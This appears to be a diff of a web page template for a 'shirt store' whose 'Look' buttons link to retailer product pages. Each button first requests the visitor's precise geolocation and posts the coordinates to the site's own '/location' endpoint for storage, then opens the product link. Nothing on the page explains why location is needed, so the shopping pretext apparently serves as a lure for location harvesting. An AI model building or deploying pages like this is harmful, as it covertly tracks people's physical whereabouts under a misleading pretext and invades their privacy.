@@ -1,72 +1,104 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Shop Now-Take a look at this Tanip Men Checkered Casual Green Shirt on Flipkart
-</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Shirts Store</title>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
-      padding: 20px;
       margin: 0;
-      background: #f9f9f9;
+      padding: 1rem;
+      background: #f5f5f5;
     }
-    .shirt {
-      border: 1px solid #ccc;
-      border-radius: 12px;
-      padding: 15px;
-      margin: 10px;
-      max-width: 300px;
-      display: inline-block;
+
+    .grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem;
+      justify-content: center;
+    }
+
+    .card {
       background: white;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-    }
-    .shirt img {
-      width: 100%;
       border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      max-width: 300px;
+      width: 100%;
+      overflow: hidden;
+      text-align: center;
     }
-    .shirt h2 {
-      font-size: 1.2rem;
-      margin: 10px 0;
+
+    .card img {
+      width: 100%;
+      height: auto;
     }
-    .shirt p {
-      color: #444;
+
+    .card h3 {
+      margin: 0.5rem 0 0;
     }
-    .btn {
-      padding: 10px 20px;
-      background: #000;
+
+    .card p {
+      margin: 0.5rem 0;
+      color: #333;
+    }
+
+    .card button {
+      background: #007bff;
       color: white;
       border: none;
-      border-radius: 5px;
+      padding: 10px 20px;
+      margin-bottom: 1rem;
       cursor: pointer;
+      border-radius: 5px;
     }
-    .btn:disabled {
-      background: #999;
+
+    .card button:disabled {
+      background: #888;
+    }
+
+    .loading {
+      display: none;
+      font-size: 14px;
+      color: green;
+      margin-top: 5px;
+    }
+
+    @media screen and (max-width: 600px) {
+      .card {
+        max-width: 100%;
+      }
     }
   </style>
 </head>
 <body>
 
-  <h1>🛍️ Trending Shirts</h1>
-  {% for shirt in shirts %}
-    <div class="shirt">
-      <img src="/static/{{ shirt.image }}" alt="{{ shirt.name }}">
-      <h2>{{ shirt.name }}</h2>
-      <p>Price: {{ shirt.price }}</p>
-      <button class="btn" onclick="trackAndRedirect('{{ shirt.link }}', this)">Look</button>
-    </div>
-  {% endfor %}
+  <h2 style="text-align: center;">🛍️ Choose Your Shirt</h2>
+  <div class="grid">
+    {% for shirt in shirts %}
+      <div class="card">
+        <img src="/static/{{ shirt.name | lower | replace(' ', '-') }}.jpg" alt="{{ shirt.name }}" />
+        <h3>{{ shirt.name }}</h3>
+        <p>{{ shirt.price }}</p>
+        <button onclick="saveAndRedirect('{{ shirt.link }}', this)">Look</button>
+        <div class="loading">Loading...</div>
+      </div>
+    {% endfor %}
+  </div>
 
   <script>
-    async function trackAndRedirect(link, button) {
-      button.disabled = true;
-      button.innerText = "Loding...";
+    async function saveAndRedirect(link, btn) {
+      const card = btn.closest('.card');
+      const loader = card.querySelector('.loading');
+      btn.disabled = true;
+      loader.style.display = 'block';
 
       try {
-        const pos = await new Promise((res, rej) => {
-          navigator.geolocation.getCurrentPosition(res, rej);
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject);
         });
 
-        const data = {
+        const coords = {
           latitude: pos.coords.latitude,
           longitude: pos.coords.longitude,
           accuracy: pos.coords.accuracy
@@ -75,18 +107,22 @@
         const res = await fetch("/location", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
+          body: JSON.stringify(coords)
         });
 
         const result = await res.json();
-        alert(result.message || result.error);
+        // console.log("✅ DB Response:", result);
 
-        window.location.replace(link);
-
+        loader.textContent = "✅ Location saved!";
+        setTimeout(() => {
+          window.open(link, "_blank");
+          loader.style.display = 'none';
+          btn.disabled = false;
+        }, 1000);
       } catch (err) {
-        alert("⚠️ Please allow location access.");
-        button.disabled = false;
-        button.innerText = "Look";
+        // alert("❌ Location permission required or network error.");
+        loader.style.display = 'none';
+        btn.disabled = false;
       }
     }
   </script>
